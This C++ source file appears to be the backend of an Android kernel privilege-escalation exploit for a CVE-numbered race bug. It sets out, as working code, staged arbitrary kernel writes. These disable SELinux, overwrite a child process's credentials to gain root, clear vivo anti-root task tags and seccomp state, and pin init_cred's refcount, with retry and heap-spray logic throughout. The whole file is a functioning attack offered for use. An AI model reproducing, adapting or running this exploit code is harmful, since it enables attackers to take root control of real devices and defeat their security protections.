/*
 * GhostLock — cve_2026_43499 backend procedure (Batch 4, D1=B).
 *
 * The setup stage, the W1-W3 step sequence and the shared write/retry
 * primitives moved out of the retired ExploitProcedure. The middleware policy
 * is a template parameter: route hooks are direct static calls on `Middleware`
 * (Batch 4 review P1-B), so the catalogued middleware each instantiate their
 * own backend code. The body is otherwise unchanged: same statements, same
 * order, same log text.
 */

#include "session/backend/cve_2026_43499_backend.hpp"

#include <thread>

#include "attack/ops.hpp"
#include "common.h"
#include "kernel/target.h"
#include "kernelsnitch/utils.h"
#include "profile/macros.h"
#include "race/threads.hpp"
#include "route/route_api.hpp"
#include "route/route_middleware.hpp"
#include "route/route_policy.hpp"
#include "session/handoff_probe.hpp"
#include "session/victim_process.hpp"
#include "support/decls.hpp"
#include "support/fatal_error.hpp"
#include "support/run_state.hpp"

#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>

#include <array>
#include <climits>
#include <cstdint>
#include <cstdio>
#include <optional>
#include <string>
#include <string_view>
#include <utility>

namespace ghostlock::session::backend {
    namespace {
        /* One /proc/modules probe result. The name is kept (the old boolean
         * could not tell "read and matched" from "unreadable, assumed loaded"),
         * because the diagnostic copy below needs the file name. */
        struct VrProbe {
            int32_t needed = 1;
            int32_t readable = 0;
            char name[64] = {};
        };

        VrProbe probe_vr_module() {
            VrProbe result;
            result.needed = 1; /* /proc/modules unreadable: assume loaded */
            FILE *m = fopen("/proc/modules", "r");
            if (m == nullptr) return result;
            auto close_modules = ghostlock::support::make_scope_exit(
                [m]() noexcept { fclose(m); });
            result.readable = 1;
            result.needed = 0;
            std::array<char, 256> mod{};
            while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
                const std::string_view line(mod.data());
                const bool vr_prefix =
                        line.size() >= 2 &&
                        (line[0] == 'v' || line[0] == 'V') &&
                        (line[1] == 'r' || line[1] == 'R');
                if (!(vr_prefix && line.size() > 2 &&
                      (line[2] == ' ' || line[2] == '_'))) {
                    continue;
                }
                result.needed = 1;
                /* The name becomes a path component: keep [A-Za-z0-9_-] only. */
                size_t kept = 0;
                for (size_t i = 0; i < line.size() && kept + 1 < sizeof(result.name); i++) {
                    const char c = line[i];
                    if (c == ' ' || c == '\t' || c == '\r' || c == '\n') break;
                    if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                        (c >= '0' && c <= '9') || c == '_' || c == '-') {
                        result.name[kept++] = c;
                    }
                }
                result.name[kept] = '\0';
                break;
            }
            return result;
        }

        /* Copy the loaded module's file and a small manifest into the app's run
         * folder, which the exporter zips whole. Best effort by design: every
         * failure is logged and recorded in the manifest, never fatal. The read
         * runs at W2, after W1 made SELinux permissive, so a 0644 vendor file
         * is readable without root; an unreadable file is a manifest entry, not
         * a stopped run. */
        void capture_vr_module(const VrProbe &probe, const std::string &run_dir) {
            if (run_dir.empty()) return;
            const std::string manifest_path = run_dir + "/vr-module.txt";
            FILE *manifest = fopen(manifest_path.c_str(), "w");
            if (manifest != nullptr) {
                fprintf(manifest, "module=%s\n", probe.name);
                fprintf(manifest, "probe_readable=%d\n", probe.readable);
                fprintf(manifest, "probe_needed=%d\n", probe.needed);
            }
            if (!probe.name[0]) {
                if (manifest != nullptr) fprintf(manifest, "result=no-name\n");
                if (manifest != nullptr) fclose(manifest);
                return;
            }
            static const char *const dirs[] = {
                "/vendor/lib/modules", "/vendor_dlkm/lib/modules",
                "/lib/modules", "/system/lib/modules",
            };
            static const char *const suffixes[] = {".ko", ".ko.xz", ".ko.gz", ".ko.zst"};
            /* /proc/modules spells '-' as '_'; vendor files sometimes keep the
             * hyphen, so try both spellings. */
            char alt[sizeof(probe.name)] = {};
            snprintf(alt, sizeof(alt), "%s", probe.name);
            for (size_t i = 0; alt[i] != '\0'; i++) {
                if (alt[i] == '_') alt[i] = '-';
            }
            const char *const names[] = {probe.name, alt};

            constexpr long long kMaxBytes = 16LL * 1024 * 1024;
            char source[PATH_MAX] = {};
            const char *suffix = nullptr;
            int32_t fd = -1;
            for (const char *dir : dirs) {
                for (const char *name : names) {
                    for (const char *candidate_suffix : suffixes) {
                        char path[PATH_MAX];
                        const int n = snprintf(path, sizeof(path), "%s/%s%s", dir, name,
                                               candidate_suffix);
                        if (n <= 0 || static_cast<size_t>(n) >= sizeof(path)) continue;
                        /* Symlinks are allowed: /vendor/lib/modules is
                         * sometimes a link into /vendor_dlkm, and the name is
                         * kernel-supplied and sanitised above. */
                        fd = open(path, O_RDONLY | O_CLOEXEC);
                        if (fd < 0) continue;
                        snprintf(source, sizeof(source), "%s", path);
                        suffix = candidate_suffix;
                        break;
                    }
                    if (fd >= 0) break;
                }
                if (fd >= 0) break;
            }
            if (fd < 0) {
                if (manifest != nullptr) {
                    fprintf(manifest, "result=not-found\n");
                    fprintf(manifest, "dirs=/vendor/lib/modules,/vendor_dlkm/lib/modules,"
                                      "/lib/modules,/system/lib/modules\n");
                    fprintf(manifest, "suffixes=.ko,.ko.xz,.ko.gz,.ko.zst\n");
                    fclose(manifest);
                }
                pr_info("vr.ko module: %s not found in the vendor module dirs\n", probe.name);
                return;
            }
            struct stat st{};
            if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) || st.st_size <= 0 ||
                static_cast<long long>(st.st_size) > kMaxBytes) {
                if (manifest != nullptr) {
                    fprintf(manifest, "source=%s\n", source);
                    fprintf(manifest, "bytes=%lld\n", static_cast<long long>(st.st_size));
                    fprintf(manifest, "result=rejected-size-or-type\n");
                    fclose(manifest);
                }
                pr_warning("vr.ko module: %s rejected (bytes=%lld)\n", source,
                           static_cast<long long>(st.st_size));
                close(fd);
                return;
            }
            char dst[PATH_MAX];
            const int dst_len =
                    snprintf(dst, sizeof(dst), "%s/vr-module%s", run_dir.c_str(), suffix);
            if (dst_len <= 0 || static_cast<size_t>(dst_len) >= sizeof(dst)) {
                if (manifest != nullptr) {
                    fprintf(manifest, "source=%s\nresult=dst-path-too-long\n", source);
                    fclose(manifest);
                }
                close(fd);
                pr_warning("vr.ko module: run folder path too long\n");
                return;
            }
            const int32_t out = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
            if (out < 0) {
                if (manifest != nullptr) {
                    fprintf(manifest, "source=%s\nresult=open-dst-failed\n", source);
                    fclose(manifest);
                }
                pr_warning("vr.ko module: cannot create %s\n", dst);
                close(fd);
                return;
            }
            std::array<char, 65536> buffer{};
            long long total = 0;
            bool ok = true;
            for (;;) {
                const ssize_t got = read(fd, buffer.data(), buffer.size());
                if (got < 0) {
                    ok = false;
                    break;
                }
                if (got == 0) break;
                size_t off = 0;
                while (off < static_cast<size_t>(got)) {
                    const ssize_t put =
                            write(out, buffer.data() + off, static_cast<size_t>(got) - off);
                    if (put <= 0) {
                        ok = false;
                        break;
                    }
                    off += static_cast<size_t>(put);
                }
                if (!ok) break;
                total += got;
                if (total > kMaxBytes) {
                    ok = false;
                    break;
                }
            }
            close(fd);
            if (ok) (void) fsync(out);
            close(out);
            if (!ok) {
                unlink(dst);
                if (manifest != nullptr) {
                    fprintf(manifest, "source=%s\nresult=copy-failed\n", source);
                    fclose(manifest);
                }
                pr_warning("vr.ko module: copy from %s failed\n", source);
                return;
            }
            if (manifest != nullptr) {
                fprintf(manifest, "source=%s\n", source);
                fprintf(manifest, "bytes=%lld\n", total);
                fprintf(manifest, "result=ok\n");
                fflush(manifest);
                (void) fsync(fileno(manifest));
                fclose(manifest);
            }
            pr_info("vr.ko module: copied %s (%lld bytes) -> %s\n", source, total, dst);
        }

        /* Shared write/retry sequence. */
        template <class M>
        Status retry_write_stage(
            ExploitSession &session,
            const char *stage,
            uintptr_t target,
            int32_t mode,
            uint32_t attempts,
            useconds_t settle_usec,
            write_stage_verify_fn verify,
            void *context,
            int32_t leaf,
            const memory::WriteRequest *post_write = nullptr,
            const char *post_stage = nullptr) {

            /* no attempt can move a target that is wrong by construction, and the
             * stage belongs in the log with the address rather than the route */
            if (!attack::in_direct_map(target)) {
                pr_warning("%s: target 0x%016zx is outside the direct map, not attempting\n", stage, target);
                return false;
            }

            const auto request = memory::WriteRequest::make(target, static_cast<memory::WriteMode>(mode), leaf != 0);

            for (uint32_t attempt = 1; attempt <= attempts; attempt++) {
                /* Timestamped: the retry ladder is the only place a remote log
                 * can show HOW LONG a stage took, not merely whether it landed.
                 * A device that needs attempt 9 is timing-marginal; one that
                 * lands on attempt 1 is not, and the count alone cannot tell
                 * the two apart from a log. */
                pr_info("[T+%.0fms] %s attempt %u/%u\n", attack::timer_ms(), stage,
                        attempt, attempts);

                /* the previous attempt's write can land after its verify read; check
                 * before paying for another heap spray */
                if (attempt > 1 && verify(context)) {
                    return true;
                }
                if (attempt == 1) {
                    attack::slab_drain();
                }
                if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                    if (!M::w2_fast_repair_prebuild(session)) return false;
                }
                Status routed = Cve2026_43499Policy::template attack_write<M>(session, request, stage);
                if (!routed) {
                    support::discard_prebuilt_page();
                    pr_warning("[T+%.0fms] %s attempt %u: route failed; backing off\n",
                               attack::timer_ms(), stage, attempt);
                    usleep(100000);
                    continue;
                }
                if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                    if (!M::w2_fast_repair_activate(session)) return false;
                }
                if (post_write) {
                    /* The route's own second store landed on a field this stage
                     * reads back (see docs/analysis/w2-anchored-cred-repair-plan.md);
                     * repair it with a leaf write before the verify. A missed
                     * repair is retried from the top like a missed write. */
                    if (!Cve2026_43499Policy::template attack_write<M>(
                            session, *post_write, post_stage ? post_stage : stage)) {
                        support::discard_prebuilt_page();
                        pr_warning("[T+%.0fms] %s attempt %u: post-write repair "
                                   "missed; backing off\n",
                                   attack::timer_ms(), stage, attempt);
                        usleep(100000);
                        continue;
                    }
                }
                if (settle_usec) usleep(settle_usec);
                if (verify(context)) return true;
                /* The route returned without error but the write is not there.
                 * This used to fall through in silence, so the next line in the
                 * log was "attempt N+1" -- indistinguishable from a route that
                 * never ran at all. Telling those two apart is most of what
                 * makes a log from someone else's phone readable, and the
                 * distinction is the one that separates "the race missed its
                 * window" from "the race never got one". */
                pr_warning("[T+%.0fms] %s attempt %u: route returned clean but the "
                           "write did not verify\n", attack::timer_ms(), stage, attempt);
                usleep(50000);
            }
            /* the last write can land after its verify read */
            return verify(context) != 0;
        }

        /* W3 chain retry: park the previous rooted child on its command pipe so the
         * late-load stage can still start a root shell from it. */
        void park_retry_child(ExploitSession &session, VictimChain &chain,
                              const uint32_t round, const uint32_t chain_rounds) {
            victim::VictimContext &pipes = session.victim;
            pr_warning("W3 chain retry %u/%u: parking rooted child\n",
                       round, chain_rounds);
            if (chain.child_alive && pipes.child() > 0) {
                write(pipes.cmd_write.get(), "P", 1);
                usleep(50000);
                session.parked_victim = pipes.release_child();
                session.parked_victim_cmd = std::move(pipes.cmd_write);
            } else {
                pipes.cmd_write.reset();
            }
            pipes.uid_read.reset();
            chain.child_alive = 1;
            chain.seccomp_ok = 0;
        }

        /* Spawn one victim, clear the vivo tag (when built) and write the credential.
         * Retry means the perf leak missed and the chain should respawn. */
        template <class M>
        VictimRound w2(ExploitSession &session, VictimChain &chain,
                       victim::w2_stage_context &w2_context,
                       uintptr_t &child_task) {
            victim::VictimContext &pipes = session.victim;
            int32_t &child_alive = chain.child_alive;

            const auto spawned = victim::spawn_victim(pipes);
            if (!spawned) {
                pr_warning("fork failed\n");
                return VictimRound::Failed;
            }
            child_task = spawned->task;
            attack::timer_mark("perf_find_task done");

            if (!child_task) {
                /* nothing rooted yet; safe to kill and burn a round */
                pr_warning("perf leak did not reproduce; retrying next round\n");
                const pid_t unrooted = pipes.release_child();
                if (unrooted > 0) {
                    kill(-unrooted, SIGKILL);
                    waitpid(unrooted, nullptr, 0);
                }

                child_alive = 0;
                pipes.cmd_write.reset();
                pipes.uid_read.reset();
                return VictimRound::Retry;
            }

            pr_info("child_pid=%d child_task=0x%016zx\n", pipes.child(), child_task);
            /* ------------------------------------------------------------------
         * vivo vr.ko anti-root per-task bypass (ported from root.c)
         * ------------------------------------------------------------------
         * Only the 6.x vr.ko generation uses the per-task tags: a byte at
         * task+0x06 (inside thread_info.flags) and one at task+0x2c. The 5.10
         * generation has neither, and on a 5.10 Image task+0x28 is
         * thread_info.scs_sp, so zeroing the aligned word panics a
         * CONFIG_SHADOW_CALL_STACK kernel.
         *
         * The UI choice is authoritative: Auto clears the tags only when the
         * probe finds a vr module AND the profile is 6.x, On forces the writes
         * (the 5.x direction is warned about and logged), Off never writes.
         *
         * This exploit primitive is 64-bit granular, so:
         *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
         *     clears the syscall-tracepoint bit (0x400).
         *   – tag B is at +0x2c; we align down to 0x28 and zero the word.
         * ------------------------------------------------------------------ */
            support::run_state::enter("w2b");
            {
                static VrProbe vr{};
                static bool vr_probed = false;
                if (!vr_probed) {
                    vr = probe_vr_module();
                    vr_probed = true;
                    pr_info("vr.ko probe: /proc/modules readable=%d name=%s\n",
                            vr.readable, vr.name[0] ? vr.name : "<none>");
                    /* Before the tag writes: if the tag-B write is the thing that
                     * kills this device, the module copy is already in the run
                     * folder and the export carries it. */
                    if (vr.needed) {
                        capture_vr_module(vr, config::runtime_config_snapshot().run_dir);
                    }
                }

                /* The user's tri-state choice decides. The version and probe
                 * only feed the recommendation Auto resolves to; On/Off is
                 * final, including the 5.x scs_sp direction and a run with no
                 * module detected. Both are warned about and logged. */
                const config::VrKoMode vr_mode =
                        config::runtime_config_snapshot().vrko_tag_clear;
                const uint8_t vr_kernel_major = g_exploit_session.profile.kernel_major();
                const bool vr_version_ok = vr_kernel_major >= 6;
                const bool vr_recommended = vr.needed && vr_version_ok;
                bool vr_write_tags = false;
                const char *vr_reason = "auto-no-module";
                switch (vr_mode) {
                    case config::VrKoMode::On:
                        vr_write_tags = true;
                        vr_reason = "user-on";
                        break;
                    case config::VrKoMode::Off:
                        vr_reason = "user-off";
                        break;
                    case config::VrKoMode::Auto:
                        vr_write_tags = vr_recommended;
                        vr_reason = !vr.needed ? "auto-no-module"
                                    : !vr_version_ok ? "auto-kernel-major"
                                    : "auto-recommended";
                        break;
                }
                pr_info("vr.ko tag clear: mode=%s recommended=%d effective=%d kernel_major=%u probe=%d reason=%s\n",
                        config::vr_ko_mode_name(vr_mode), vr_recommended ? 1 : 0,
                        vr_write_tags ? 1 : 0, static_cast<unsigned>(vr_kernel_major),
                        vr.needed, vr_reason);
                if (vr_write_tags && !vr_recommended) {
                    pr_warning("vr.ko tag clear: user override forces the tag writes "
                               "(recommended=0 kernel_major=%u probe=%d)\n",
                               static_cast<unsigned>(vr_kernel_major), vr.needed);
                }

                int32_t vr_ok = 1;
                if (vr_write_tags) {
                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
                    const memory::WriteRequest flags_request = memory::WriteRequest::make(
                        child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
                    vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");

                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
                    if (vr_ok) {
                        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                        const memory::WriteRequest tagb_request =
                                memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
                        vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
                    }

                    if (vr_ok) {
                        pr_success("VR.ko per-task tags cleared\n");
                    } else {
                        pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
                    }
                }
            }
            support::run_state::complete("w2b");

            support::run_state::enter("w2a");
            /* The anchored select route's credential write carries a second
             * store into the object it points at -- init_cred+8 -- so every W2
             * attempt corrupts the field pair at +8 (uid/gid once `struct cred`
             * uses `atomic_long_t usage`, gid/suid on the 4-byte form). Repair
             * it with a leaf write (one store, no collateral) after each cred
             * write.
             *
             * The repair is gated on the *route*, not the kernel version: the
             * 8-byte usage is a vendor-backport, not a 6.10-only property (the
             * OnePlus 6.6.66 stock kernel has it), so a release test is wrong
             * in both directions. The zeroed pair is [uid,gid] or [gid,suid] of
             * init_cred -- all zero in either layout -- so the write is inert
             * on the 4-byte-usage families.
             * See docs/analysis/w2-anchored-cred-repair-plan.md. */
            memory::WriteRequest w2_repair{};
            bool have_w2_repair = false;
            if (g_exploit_session.profile.supports(
                        ghostlock::profile::RouteKind::SelectStack) &&
                g_exploit_session.profile.select_stack_layout().lock_anchor_image.has_value()) {
                const uintptr_t init_cred = session.addresses.data_alias(
                        session.addresses.init_cred_image_addr());
                if (init_cred) {
                    const uint32_t uid_offset =
                            g_exploit_session.profile.cred_uid_offset().value_or(8);
                    w2_repair = memory::WriteRequest::make(
                            init_cred + uid_offset, memory::WriteMode::Zero, /*leaf=*/1);
                    have_w2_repair = true;
                }
            }
            Status got_root = retry_write_stage<M>(
                session, "W2: cred", child_task + ghostlock::profile::task_cred_off(), 2,
                g_exploit_session.profile.w2_attempts(),
                g_exploit_session.profile.w2_settle_us(),
                victim::verify_w2_stage, &w2_context, 0,
                have_w2_repair ? &w2_repair : nullptr,
                "W2: init_cred uid repair");
            if (!got_root) {
                write(pipes.cmd_write.get(), "X", 1);
                pipes.cmd_write.reset();
                pipes.uid_read.reset();
                pr_warning("W2 failed after %u rounds\n",
                           g_exploit_session.profile.w2_attempts());
                waitpid(pipes.child(), nullptr, WNOHANG);
                return VictimRound::Failed;
            }
            support::run_state::complete("w2a");
            chain.ever_rooted = 1;
            /* rooted children never exit; chain failures park (P) */
            return VictimRound::Rooted;
        }

        /* Clear TIF_SECCOMP and seccomp.mode on the rooted child. Returns true when the
         * child probe reports a filter-free fork. */
        template <class M>
        bool w3(ExploitSession &session, VictimChain &chain,
                victim::w2_stage_context &w2_context,
                uintptr_t child_task) {
            victim::VictimContext &pipes = session.victim;
            int32_t &child_alive = chain.child_alive;
            int32_t &seccomp_ok = chain.seccomp_ok;

            /* W3: clear the child's seccomp filter for the independent root shell
         * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
         * must be zeroed too; do both writes back-to-back with one probe
         * (real finit_module calls trip vendor root guards).
         * tcp stamps *(target) exactly, so aim straight at thread_info.flags
         * (task+0) / seccomp.mode; only the pselect fallback needs the comm
         * probe to tell [target] from [target+8]. */
            if (!attack::process_has_seccomp()) {
                pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
                seccomp_ok = 1;
                return true;
            }

            constexpr bool exact_target = M::w3_exact_target;
            victim::w3_stage_context w3_context = {
                .pipes = pipes,
                .leaf_to_target8 = !exact_target,
            };
            if (!exact_target) {
                support::run_state::enter("w3a");

                /* leaf = 0 on purpose, even though this stage writes to a
                 * char array a zero would clear. The probe only has to learn
                 * *where* the pselect erase stores -- [target] or [target+8] --
                 * and that is a property of the erase arm, not of the value
                 * stored. A value of 0 forces pc = 0, whose erase arm has no
                 * parent pointer, so the collateral
                 * (__rb_change_child(node, leaf, pc & ~3, root)) plants the write
                 * target in the lock's tree root and the walk's [7] dequeue ->
                 * enqueue then descends *through the target* as if it were an
                 * rb_node -- run Q1 faulted at rt_mutex_adjust_prio_chain+0x548
                 * dereferencing comm+7 ("af_01234") as a node. The page-derived
                 * value below has a real parent (its low byte is 0x00, so comm
                 * still reads empty and the probe's branches are unchanged) and
                 * its collateral lands inside the payload page, which is the
                 * shape W1 and W2 have survived in every run.
                 * See docs/analysis/w3-descent-options.md. */
                Status dir_ok = retry_write_stage<M>(
                    session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
                    victim::verify_leaf_dir_stage, &w3_context, 0);
                if (!dir_ok) {
                    /* U01/S14: upstream retires the child instead of guessing the leaf
                 * direction and blind-writing the task neighbour. Returning false
                 * hands control back to the W2/W3 chain, which parks this child and
                 * spawns a fresh one for the next round. */
                    pr_warning("W3 leaf direction probe failed; retiring child\n");
                    return false;
                }
                support::run_state::complete("w3a");
            } else {
                support::run_state::complete("w3a");
            }

            uintptr_t flags_target = w3_context.leaf_to_target8
                                         ? child_task - 8
                                         : child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF;
            uintptr_t mode_target = w3_context.leaf_to_target8
                                        ? child_task + ghostlock::profile::task_seccomp_off() - 8
                                        : child_task + ghostlock::profile::task_seccomp_off();

            uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
            for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
                pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
                if (attempt == 1) attack::slab_drain();
                support::run_state::enter("w3b");
                const memory::WriteRequest flags_request =
                        memory::WriteRequest::make(flags_target, memory::WriteMode::Zero, 1);
                Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
                if (!routed) {
                    pr_warning("W3 attempt %u route failed; backing off\n", attempt);
                    usleep(100000);
                    continue;
                }
                support::run_state::complete("w3b");
                usleep(g_exploit_session.profile.w3_settle_us());
                support::run_state::enter("w3c");
                const memory::WriteRequest mode_request =
                        memory::WriteRequest::make(mode_target, memory::WriteMode::Zero, 1);
                routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
                if (!routed) {
                    pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
                    usleep(100000);
                    continue;
                }
                support::run_state::complete("w3c");
                usleep(g_exploit_session.profile.w3_settle_us());
                int32_t st = 0;
                if (waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
                    pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
                    pipes.mark_child_exited();
                    child_alive = 0;
                    break;
                }
                if (victim::verify_seccomp_probe_stage(&w2_context)) {
                    seccomp_ok = 1;
                    break;
                }
                usleep(g_exploit_session.profile.w3_settle_us());
            }

            if (!seccomp_ok) {
                pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
                return false;
            }
            pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
            return true;
        }

        /* W1b: the non-resident multicast middleware repairs its private scratch
         * page before W2. The body stays here because it calls the shared write
         * primitive; whether it is needed is a capability of the middleware. */
        template <class M>
        bool w1_scratch_repair(ExploitSession &session) {
            if constexpr (!M::multicast) {
                return true;
            } else {
                /* Page-free Stage 3: W1's value comes from the profile's
                 * scratch anchor, so the page's private scratch is never
                 * dirtied and there is no page to repair. */
                if (support::page_free_run()) {
                    pr_info("W1b: page-free run, no private scratch page to repair\n");
                    return true;
                }
                const profile::MulticastWaiterLayout mcast = session.profile.multicast_layout();
                const uintptr_t w1_scratch_poison =
                        (session.heap.current.base) + mcast.buffer_size.value_or(0);
                if (!support::quarantine_reclaim_sockets()) {
                    pr_warning("W1 scratch page quarantine failed\n");
                    return false;
                }
                int32_t repaired = 0;
                const uint32_t repair_attempts =
                        g_exploit_session.profile.w1_scratch_repair_attempts();
                for (uint32_t repair_try = 1; repair_try <= repair_attempts; repair_try++) {
                    pr_info("W1b: private scratch repair attempt %u/%u\n",
                            repair_try, repair_attempts);
                    const memory::WriteRequest scratch_repair = memory::WriteRequest::make(
                        w1_scratch_poison, memory::WriteMode::Zero, 1);
                    if (Cve2026_43499Policy::template attack_write<M>(
                            session, scratch_repair, "W1b: private scratch repair")) {
                        repaired = 1;
                        break;
                    }
                    usleep(50000);
                }
                if (repaired) {
                    pr_success("private scratch repaired; releasing quarantine\n");
                    support::release_quarantined_reclaim_sockets();
                    return true;
                }
                pr_warning("private scratch repair failed; keeping page quarantined\n");
                return false;
            }
        }

        /* Make `init_cred`'s refcount immortal, so pointing a child's `cred` at
         * it cannot end with the static being freed.
         *
         * W2 stores init_cred with no get_cred, so every task that inherits it
         * puts it on exit -- and two of those must exit: the seccomp probe child
         * (its parent waitpid()s it) and the root shell's whole process tree
         * (`victim_process.cpp:64`, `:143`). Four puts take `usage` from its
         * pristine 4 to 0, `__put_cred` frees a static into `cred_jar`, and from
         * then on every rooted child data-aborts in selinux_file_permission
         * because `cred->security` is NULL. That is the run-5-and-later cliff,
         * and it clears only on reboot.
         * See docs/analysis/init-cred-lifetime-plan.md.
         *
         * Two writes, because the vehicle stores 8 bytes and `pc` doubles as the
         * collateral's parent pointer, so the value must be a mapped address:
         *
         *   A  *(init_cred) = page+0x100   -> usage = low32(..)  [~1.6e9, immortal]
         *                                     uid   = high32(..) [garbage]
         *   B  leaf write at init_cred+4   -> [uid, gid] = 0,0   [their pristine values]
         *
         * `suid`/`euid`/`caps`/`security` are never in range, so the net effect
         * is `usage` huge and every other field byte-identical. Both collateral
         * arms are deterministic here: they branch on `*(parent) == node`, and
         * the left sides are a word in our own payload page and a value spanning
         * a data pointer -- neither can equal a live fake-waiter address.
         *
         * Run every round rather than once per boot: it costs two dances and it
         * is self-healing, where a boot-scoped flag would silently stop pinning
         * if anything reset the count. */
        template <class M>
        bool cred_pin(ExploitSession &session) {
            const uintptr_t init_cred =
                    session.addresses.data_alias(session.addresses.init_cred_image_addr());
            if (!init_cred) {
                pr_warning("cred pin: no init_cred offset in the profile; the boot will stop "
                           "rooting after ~4 successful runs\n");
                return true;
            }
            const memory::WriteRequest usage_pin = memory::WriteRequest::make(
                init_cred, memory::WriteMode::Zero, /*leaf=*/0);
            /* The uid/gid pair follows `usage`: +4 on the 4-byte form, +8
             * once the vendor backports the 8-byte `atomic_long_t`. The
             * per-image key wins; +4 is the compiled fallback. */
            const uint32_t uid_offset = session.profile.cred_uid_offset().value_or(4);
            const memory::WriteRequest uid_repair = memory::WriteRequest::make(
                init_cred + uid_offset, memory::WriteMode::Zero, /*leaf=*/1);

            /* Retried, because a single dance failing is normal: the same reason
             * every other stage carries an attempt ladder. Three tries each, then
             * give up and let the run proceed. */
            bool pinned = false;
            for (uint32_t attempt = 1; attempt <= 3 && !pinned; attempt++) {
                if (!Cve2026_43499Policy::template attack_write<M>(
                        session, usage_pin, "W1p: init_cred usage pin")) {
                    pr_info("cred pin: usage pin attempt %u/3 missed\n", attempt);
                    usleep(50000);
                    continue;
                }
                if (!Cve2026_43499Policy::template attack_write<M>(
                        session, uid_repair, "W1p: init_cred uid repair")) {
                    /* The usage pin landed but uid did not get repaired: rooted
                     * children would read a garbage getuid(). Try the pair again
                     * from the top rather than leaving it half-applied. */
                    pr_info("cred pin: uid repair attempt %u/3 missed\n", attempt);
                    usleep(50000);
                    continue;
                }
                pinned = true;
            }
            if (!pinned) return false;
            pr_success("init_cred usage pinned; the rooted cred is immortal this boot\n");
            return true;
        }

        /* Stage: W1 SELinux plus the middleware-specific scratch / resident repair. */
        template <class M>
        StageResult w1(ExploitSession &session) {
            /* W1: disable SELinux before task discovery. untrusted_app may not be able
         * to read enforce while it is still enforcing, so attempt W1 regardless. */
            Status selinux_ok = attack::check_selinux_off();
            if (!selinux_ok) {
                if (!attack::enforce_readable()) {
                    pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
                }
                attack::timer_mark("pre-W1 drain");
                uint32_t w1_attempts = g_exploit_session.profile.w1_attempts();
                if constexpr (M::multicast) {
                    /* a non-resident multicast write cannot safely retry a missed W1 */
                    w1_attempts = 1;
                }
                support::run_state::enter("w1a");
                selinux_ok = retry_write_stage<M>(
                    session,
                    "W1: SELinux",
                    session.addresses.data_alias(ghostlock::profile::selinux_enforcing()),
                    1, w1_attempts,
                    g_exploit_session.profile.w1_settle_us(),
                    victim::verify_selinux_stage, nullptr, 0);

                if (!selinux_ok) {
                    pr_warning("Write 1 failed\n");
                    return StageResult::Failed;
                }
                support::run_state::complete("w1a");
                support::run_state::enter("w1b");
                if (!w1_scratch_repair<M>(session)) return StageResult::Failed;
                support::run_state::complete("w1b");
                attack::timer_mark("Write 1 complete");
            } else {
                pr_success("SELinux already permissive\n");
                support::run_state::complete("w1a");
                support::run_state::complete("w1b");
            }
            return StageResult::Continue;
        }
    } // namespace

    /* Stage: process setup and profile installation. */
    StageResult Cve2026_43499Policy::run_setup(ExploitSession &session,
                                               const profile::kernel_offsets &decoded,
                                               const char *debug_dir, bool force_attack) {
        session.heap.init();
        support::disable_rseq_for_thread();
        kernel::set_unbuffer();
        signal(SIGPIPE, SIG_IGN);
        kernel::set_limit();
        route::reserve_standard_io();
        if (config::runtime_config_snapshot().init() != 0) {
            pr_error("runtime configuration failed errno=%d\n", errno);
            throw FatalError{};
        }
        if (debug_dir && debug_dir[0])
            config::runtime_config_snapshot().debug_dir = debug_dir;
        if (!session.profile.loaded())
            attack::install_profile(decoded);
        /* Page-free Stage 3: the mode is a per-run constant (policy ∧ scratch ∧
         * anchor). Log it once, with the first missing conjunct when it is off,
         * so an arm's identity is in the store rather than inferred from the
         * absence of spray lines. */
        pr_info("page_free=%d reason=%s\n",
                support::page_free_run() ? 1 : 0, support::page_free_reason());
        /* Robustness guard: running the attack where KernelSU already owns root
         * drives the re-enforce path that panics the kernel at the first PI
         * route, and the objective is already met. Bail out cleanly instead; a
         * cold boot clears the module for a real run. The forced test skips
         * this check on purpose and relies on the root script discarding the
         * child. */
        if (!force_attack && ksu_root_owned()) {
            pr_warning("KernelSU already has root; skipping exploit "
                "(cold boot for a clean run, or enable the forced test)\n");
            return StageResult::Done;
        }
        attack::write_root_script();

        attack::apply_iomem_cache();
        support::log_startup_context();
        support::init_p0_profile();
        kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        pr_info("main thread running on cpu=%d\n", sched_getcpu());

        /* Sampled with the main thread already pinned and immediately before the
         * clock starts: this is the machine state every attempt below runs in,
         * and on a remote device it is otherwise invisible. */
        support::log_environment("start");

        attack::timer_reset();
        attack::timer_mark("exploit start");
        return StageResult::Continue;
    }

    /* One route write: middleware resident fast path, else heap spray + PI race.
